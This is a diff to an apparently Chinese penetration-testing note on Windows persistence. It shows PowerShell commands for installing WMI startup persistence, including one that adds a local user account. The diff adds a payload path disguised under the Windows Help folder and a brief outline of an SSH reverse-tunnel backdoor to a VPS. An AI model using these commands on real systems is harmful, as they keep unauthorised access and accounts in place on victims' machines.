@@ -131,6 +131,8 @@ Import-Module .\WMI-Persistence.ps1
 Install-Persistence -Trigger Startup -Payload "c:\windows\notepad.exe"
 或
 Install-Persistence -Trigger Startup -Payload "net user test /add"
+或
+Install-Persistence -Trigger Startup -Payload "C:\Windows\Help\OEM\payload.bat"
 ```
 删除后门  
 ```
@@ -162,6 +164,10 @@ Import-Module .\WMIBackdoor.ps1
 Remove-WMIBackdoor PWN
 ```
 
+### \#0x03 SSH反连后门
+目标机器上启动SSH Server，使用SSH Client将SSH Server的端口反向代理到VPS。  
+该方法需借助计划任务或者WMI Persistence保证系统重启后仍有效。  
+具体方法不再这里讨论了。  
 
 ### 参考
 * [渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/)  
